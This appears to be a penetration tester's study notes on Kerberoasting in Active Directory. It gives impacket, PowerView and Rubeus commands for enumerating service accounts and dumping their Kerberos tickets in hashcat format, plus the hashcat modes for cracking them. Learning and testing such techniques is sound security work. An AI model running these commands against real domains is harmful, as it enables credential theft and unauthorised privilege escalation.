When we acquired valid credentials for user in the AD, we then can attempt to perform Kerberoasting, since all users in a domain can request Kerboros ticket for any service account in the domain, as service account are often configured to have high privilege, the ticket itself won't do you good, however the ticket is encrypted with the service account's NTLM hash, therefore we can potentially obtain such hash and crack it to reveal the cleartext password of the service account, hence granting us potentially elevated privilege

We first start by introducing methods to obtain TGS from a linux attack host:

-Using impacket-getuserspns to gather all SPN account in the domain:

```
impacket-getuserspns -dc-ip <dcip> <domainname>/<username>
```

-Using impacket-getuserspns to request all TGS ticket:
```
impacket-getuserspns -dc-ip <dcip> <domainname>/<username> -request -outputfile <outputfilename>
#We can specify user <username> at the end if we are only interested in one SPN
```

Depending on what type of ticket we get, we use:

etype23 - RC4 | hashcat mode 13100
etype17 - AES128 | hashcat mode 19600
etype18 - AES256 | hashcat mode 19700

If, however, the credentials gave us access allows us to have an rdp session, we might want to perform this process over the window host directly along with other enumeration technique:

-Using PowerView to view SPN account:
```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

-Using PowerView to extract a specific users TGS Ticket:
```
Get-DomainUser -Identity <spn> | Get-DomainSPNTicket -Format Hashcat
```

-Using PowerView to extract all ticket and export to CSV:
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv <filename> -NoTypeInformation
```

-Using Rubeus to get overview of all SPN:
```
.\Rubeus.exe kerberoast /stats
```

-Using Rubeus to view account with high level privilege:
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```